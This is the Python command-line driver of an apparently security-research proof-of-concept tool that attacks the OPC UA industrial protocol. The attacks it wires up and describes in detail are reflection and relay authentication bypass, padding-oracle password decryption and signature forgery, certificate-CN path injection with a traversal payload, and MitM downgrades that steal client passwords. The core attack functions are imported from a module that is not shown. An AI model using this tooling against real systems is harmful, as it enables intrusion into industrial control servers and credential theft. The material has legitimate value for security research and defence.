#!/usr/bin/env python3

from attacks import *

from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter, Namespace
from abc import ABC
from pathlib import Path


HELP_TEXT = """
Proof of concept tool for attacks against the OPC UA security protocol.
""".strip()

class Attack(ABC):
  """Base class for OPC attack defintions."""
  
  @property
  @abstractmethod
  def subcommand(self) -> str:
    """Command-line subcommand name."""
    ...
    
  @property
  @abstractmethod
  def short_help(self) -> str:
    """Brief description."""
    ...
    
  @property
  @abstractmethod
  def long_help(self) -> str:
    """Extended description."""
    ...
    
  @abstractmethod
  def add_arguments(self, aparser : ArgumentParser):
    """Add attack-specific options."""
    ...
    
  @abstractmethod
  def execute(self, args : Namespace):
    """Executes the attack, given specified options."""
    ...
    
def add_padding_oracle_args(aparser : ArgumentParser):
  """Adds arguments to configure a padding oracle attack"""
  aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'), default='try-both',
    help='which PKCS#1 padding oracle to use with --bypass-opn; default: try-both')
  aparser.add_argument('-T', '--timing-attack-threshold', type=float, metavar='INTERVAL', default=0,
    help='if set, will try a timing-based padding oracle with this threshold parameter (fractional; in seconds); use check -t to help determine this')
  aparser.add_argument('-C', '--timing-attack-expansion', type=int, metavar='COUNT', default=50,
    help='when used alongside -T this determines the ciphertext expansion parameter; default: 50')
  
def add_mitm_args(aparser : ArgumentParser):
  """Common arguments for MitM attacks."""
  def address_arg(arg):
    [host, port] = arg.split(':')
    return host or '0.0.0.0', int(port)
  
  aparser.add_argument('-r', '--reverse-hello', type=address_arg, metavar='client-host:port',
    help='if set, will sent a ReverseHello to connect to the client')
  aparser.add_argument('-p', '--persist', action='store_true',
    help='keep listening for incoming connections after starting an attack')
  aparser.add_argument('[listen-address]:port', type=address_arg,
    help='address to bind to to listen for incoming connections; when -r is set this is instead used as an endpointUrl in the ReverseHello message')
  aparser.add_argument('server-url', type=str,
    help='OPC URL of a (discovery) server whose certificate the client is expected to trust')

    
class CheckAttack(Attack):
  subcommand = 'check'
  short_help = 'evaluate whether attacks apply to server'
  long_help = """
Simply requests a list of endpoints from the server, and report which attacks 
may be applicable based on their configuration. This does not prove the 
endpoints are vulnerable, but helps testing a connection and determining which 
attacks are worth trying.

By default, this will be non-intrusive and only request and endpoint list. With 
--probe-password and --test-timing-attack you can enable nosier checks that may
yield additional results.

Most important results are printed to stdout. Rest to stderr.
"""

  def add_arguments(self, aparser):
    aparser.add_argument('-t', '--test-timing-attack', action='store_true',
      help='test vulnerability to timing-based padding oracle by sending a bunch of ciphertexts and timing responses; output can be helpful when picking a timing attack threshold parameter')
    aparser.add_argument('url',
      help='Target or discovery server OPC URL (either opc.tcp:// or https:// protocol)',
      type=str)
    
  def execute(self, args):
    server_checker(args.url, args.test_timing_attack)

class ReflectAttack(Attack):
  subcommand = 'reflect'
  short_help = 'authentication bypass via reflection attack'
  long_help = """
Log in to an OPC server, pretending to be the server itself by tricking it to 
sign its own nonce.

This works by setting up two sessions to the server. In the first "main" 
session the server's own certificate is supplied in the CreateSessionRequest.
If the server has allowlisted its own certificate (or accepts everyone under
the same CA), it will answer the request with a "nonce" that acts as an 
authentication challenge. Now, the tool will open up a second connection to the
same server and supply this nonce in its CreateSessionRequest. The server will 
answer this as well and set a serverSignature on the nonce. This signature is 
then copied to the ActivateSessionRequest back on the main session, taking 
advantage of the lack of domain separation between client and server signatures.

If the server requires user authentication on top of client instance 
authentication, the same technique is attempted to spoof a user certificate. 
The attack won't work if password-based authentication is required.

The default form of the attack only works against servers that support an HTTPS 
endpoint. If that is not the case, you can use the --bypass-opn flag to try and 
use the RSA PKCS#1 padding oracle (used by 'decrypt' and 'sigforge' 
attacks) to get through the initial OpenSecureChannel handshake. This attack 
will need to perform two full padding oracle decryptions: one for forging a 
signature on a OPN request, and the other to decrypt the response. The result 
of the signature forgery is reusable, while the second needs to take place 
during the lifetime of an authentication token (the duration of which the tool 
will try to maximize).
""".strip()
  
  def add_arguments(self, aparser):
    aparser.add_argument('-n', '--no-demo', action='store_true',
      help='don\'t dump server contents on success; just tell if attack worked')
    aparser.add_argument('-b', '--bypass-opn', action='store_true',
      help='when no HTTPS is available, attempt to use sigforge and decrypt attacks to bypass the opc.tcp secure channel handshake')
    aparser.add_argument('-c', '--cache-file', type=Path, default='.spoofed-opnreqs.json',
      help='file in which to cache OPN requests with spoofed signatures; default: .opncache.json')
    add_padding_oracle_args(aparser.add_argument_group('padding oracle parameters', '(applicable if --bypass-opn is set)'))
    
    aparser.add_argument('url',
      help='Target server OPC URL (either opc.tcp:// or https:// protocol)',
      type=str)
    
  def execute(self, args):    
    reflect_attack(
      args.url, 
      not args.no_demo, 
      args.bypass_opn and args.padding_oracle_type != 'password', 
      args.bypass_opn and args.padding_oracle_type != 'opn', 
      args.cache_file,
      args.timing_attack_threshold,
      args.timing_attack_expansion
    )
    
class RelayAttack(Attack):
  subcommand = 'relay'
  short_help = 'authentication bypass via relay attack between two servers'
  long_help = """
Tricks one server A to log you in to server B with A's identity.

This uses the same technique as the reflection attack, except that the two
sessions are set up against different servers. See reflect --help for more 
information.
""".strip()
  
  def add_arguments(self, aparser):
    aparser.add_argument('-n', '--no-demo', action='store_true',
      help='don\'t dump server contents on success; just tell if attack worked')
    aparser.add_argument('-b', '--bypass-opn', action='store_true',
      help='when no HTTPS is available on either or both servers, attempt to use sigforge and decrypt attacks to bypass the opc.tcp secure channel handshake')
    aparser.add_argument('-r', '--reusable-opn-file', type=Path, default='.spoofed-opnreqs.json',
      help='file in which to cache OPN requests with spoofed signatures; default: .spoofed-opnreqs.json')
    add_padding_oracle_args(aparser.add_argument_group('padding oracle parameters', 'applicable if --bypass-opn is set'))
    
    aparser.add_argument('server-a', 
      help='OPC URL of the server of which to spoof the identity', 
      type=str)
    aparser.add_argument('server-b', 
      help='OPC URL of the server on which to log in as server-a', 
      type=str)
    
  def execute(self, args):
    if args.bypass_opn:
      raise Exception('TODO: --bypass-opn option implemented for reflect; but not yet for relay')
    relay_attack(getattr(args, 'server-a'), getattr(args, 'server-b'), not args.no_demo)
    
class PathInjectAttack(Attack):
  subcommand = 'cn-inject'
  short_help = 'path injection via an (untrusted) certificate CN'
  long_help = """
Tries to connect with a self-signed client instance certificate that has a path
injection (or other) payload in the Common Name (CN) field. Takes advantage of 
implementations that follow the recommended certificate store directory layout 
(https://reference.opcfoundation.org/GDS/v105/docs/F.1) but don't do additional 
input validation.

You can supply any CN with the --cn flag. By default the payload 
'../../trusted/certs/TestCert' is used, which attempts an authentication bypass 
by getting the rejected cert placed in the trusted store instead. If this 
works, then clearly the server is vulnerable, and you may be able to achieve 
arbitrary file writes and RCE with other payloads.

Supply --second-login to make the tool try a second loginattempt with the same 
certificate, to check whether an authentication bypass payload has worked.
"""

  def add_arguments(self, aparser):
    aparser.add_argument('-c', '--cn', type=str, default='../../trusted/certs/TestCert',
      help='payload to put in CN; default: ../../trusted/certs/TestCert')
    aparser.add_argument('-s', '--second-login', action='store_true',
      help='log in a second time with the same certificate; useful for testing the default payload auth bypass')
    aparser.add_argument('-n', '--no-demo', action='store_true',
      help='don\'t dump server contents when an authentication bypass worked')
    aparser.add_argument('url', type=str,
      help='Target server OPC URL (either opc.tcp:// or https:// protocol)')
    # TODO: some way to exploit AFW better by controlling certificate content
    
    
  def execute(self, args):
    inject_cn_attack(args.url, args.cn, args.second_login, not args.no_demo)
    
class NoAuthAttack(Attack):
  subcommand = 'auth-check'
  short_help = 'tests if server allows unauthenticated access'
  long_help = """
This is not a new attack. Just a simple check to see whether a server allows 
anonymous access without authentication; either via the None policy or by 
automatically accepting untrusted certificates.

First, a login is attempted with the None policy and a reflected server 
certificate (of which ownership does not need to be proven). If that fails,
a non-None policy is picked along with a self-signed certificate (same check as 
cn-inject, but with a harmless CN).
"""

  def add_arguments(self, aparser):
    aparser.add_argument('-n', '--no-demo', action='store_true',
      help='don\'t dump server contents on success; just tell an unauthenticated session could be created')
    aparser.add_argument('-c', '--cert-only', action='store_true',
      help='only attempt to log in with a self-signed certificate; skip the None attempt')
    aparser.add_argument('url', type=str,
      help='Target server OPC URL (either opc.tcp:// or https:// protocol)')
    
  def execute(self, args):
    auth_check(args.url, args.cert_only, not args.no_demo)
    
class DecryptAttack(Attack):
  subcommand = 'decrypt'
  short_help = 'sniffed password and/or traffic decryption via padding oracle'
  long_help = """
If an OPC UA server supports the Basic128Rsa15 policy, or accepts passwords 
encrypted with the "rsa-1_5" algorithm, it is quite likely vulnerable for a 
PKCS#1 padding oracle attack. This allows you to decrypt any RSA ciphertext 
that was encrypted with that server's public key, even when that ciphertext was
using the otherwise secure OAEP padding scheme. To carry out this attack 
you do however need to still be able to connect to this server, and it should 
still be using the same public key.

One use for this is to decrypt passwords that were transmitted over channel 
using 'Sign' or 'None' message security. Another use is to extract channel
encryption session keys by decrypting nonces from the OPN handshake. However,
the latter is only possible if the client-side of the connection is also 
operating as a server, and using the same public key for that purpose.

Currently, the tool only supports decrypting hex-encoded raw payloads (although 
it will attempt to parse a password token if the plaintext looks like one). You
can use Wireshark's "Copy as Hex stream" on 
ActivateSessionRequest -> UserIdentityToken -> UserNameIdentityToken -> Password
to grab a password payload.
""".strip()
  
  def add_arguments(self, aparser):
    aparser.add_argument('url', type=str,
      help='endpoint URL of the OPC UA server owning the RSA key pair the ciphertext was produced for')
    aparser.add_argument('ciphertext', type=str,
      help='hex-encoded RSA-encrypted ciphertext; either OAEP or PKCS#1')
    add_padding_oracle_args(aparser)
    
  def execute(self, args):
    opn, password = {
      'opn'     : (True,  False),
      'password': (False, True),
      'try-both': (True,  True),
    }[args.padding_oracle_type]
    decrypt_attack(args.url, unhexlify(args.ciphertext), opn, password, args.timing_attack_threshold, args.timing_attack_expansion)
  

class SigForgeAttack(Attack):
  subcommand = 'sigforge'
  short_help = 'signature forgery via padding oracle'
  long_help = """
Uses the same padding oracle attack as 'decrypt', but instead of decrypting a
ciphertext an RSA PKCS#1 signature is forged with the private key that a server 
is using.

The technique can also be used to forge PSS signatures, but that's 
currently not implemented.

Is used automatically as part of reflect/relay attacks (with --bypass-opn). 
This command can be used to sign any other arbitrary payload. Can be used
to show the concept in isolation or perform some follow-up attack.
""".strip()
  
  def add_arguments(self, aparser):
    aparser.add_argument('-H', '--hash-function', choices=('sha1', 'sha256'), default='sha256',
      help='hash function to use in signature computation; default: sha256')
    add_padding_oracle_args(aparser)
    aparser.add_argument('url', type=str,
      help='endpoint URL of the OPC UA server whose private key to spoof a signature with')
    aparser.add_argument('payload', type=str, 
      help='hex-encoded payload to spoof a signature on')
    
  def execute(self, args):
    opn, password = {
      'opn'     : (True,  False),
      'password': (False, True),
      'try-both': (True,  True),
    }[args.padding_oracle_type]
    forge_signature_attack(args.url, unhexlify(args.payload), opn, password, SecurityPolicy.BASIC128RSA15 if args.hash_function == 'sha1' else SecurityPolicy.BASIC256, args.timing_attack_threshold, args.timing_attack_expansion)

class DowngradeMitmAttack(Attack):
  subcommand = 'client-downgrade'
  short_help = 'password stealing downgrade attack against a client'
  long_help = """
This attack can be carried out when the tool can act as a server towards an OPC UA client. This is possible when 
when the client either supports the ReverseHello mechanism, or when a network MitM position can be obtained (via. e.g. 
ARP or DNS poisoning).

The tool simply pretends to be a server that requires a password but only supports the None policy, attempting to get
the client to supply an unencrypted password. 

The server-url is used to fetch a certificate that the client is expected to trust. No further interactions are done 
with the server.

Currently only password stealing is implemented, but the same technique could be used to extract other authentication 
material such as tokens or signed nonces.
""".strip()
  
  def add_arguments(self, aparser):
    add_mitm_args(aparser)
    
  def execute(self, args):
    client_attack(nonegrade_mitm, getattr(args, 'server-url'), *getattr(args,'[listen-address]:port'), args.reverse_hello, args.persist)
    
class ByteDropMitmAttack(Attack):
  subcommand = 'client-bytedrop'
  short_help = 'password stealing downgrade attack against a client, using the "byte dropping" attack'
  long_help = """
Demonstrates the byte dropping MitM attack by modifying a signed server endpoint list such that is appears to request
the client to supply an unencrypted password. 

Takes advantage of the fact that HelloMessage parameters are unauthenticated to force the server to send signed 
messages with a payload length of one byte. By dropping messages arbitrary byte ranges (except for the final byte) can 
be removed from the payload.

The effect is this particular attack is the same as client-downgrade, except that the client does not need to accept 
the None security policy for connection security.

Requires that the server has an endpoint list that includes a Sign endpoint, and happens to have the right structure
to allow the right transformation via byterange dropping.
""".strip()
  
  def add_arguments(self, aparser):
    add_mitm_args(aparser)
    
  def execute(self, args):
    client_attack(chunkdrop_mitm, args.server_url, *args.laddress, args.reverse_hello, args.persist)

ENABLED_ATTACKS = [
  CheckAttack(),
  ReflectAttack(), 
  RelayAttack(), 
  PathInjectAttack(), 
  NoAuthAttack(),
  DecryptAttack(),
  SigForgeAttack(), 
  DowngradeMitmAttack(),
  ByteDropMitmAttack(),
]


def main():
  # Create argument parser for each attack type.
  aparser = ArgumentParser(description=HELP_TEXT, formatter_class=RawDescriptionHelpFormatter)
  subparsers = aparser.add_subparsers(metavar='attack', help='attack to test', required=True)
  for attack in ENABLED_ATTACKS:
    sparser = subparsers.add_parser(attack.subcommand, help=attack.short_help, description=attack.long_help)
    attack.add_arguments(sparser)
    sparser.set_defaults(attack_obj=attack)
    
  # Parse args and execute attack.
  args = aparser.parse_args()
  try:
    args.attack_obj.execute(args)
  except AttackNotPossible as ex:
    print(f'[-] Attack failed: {ex}')
  
  
if __name__ == '__main__':
  main()
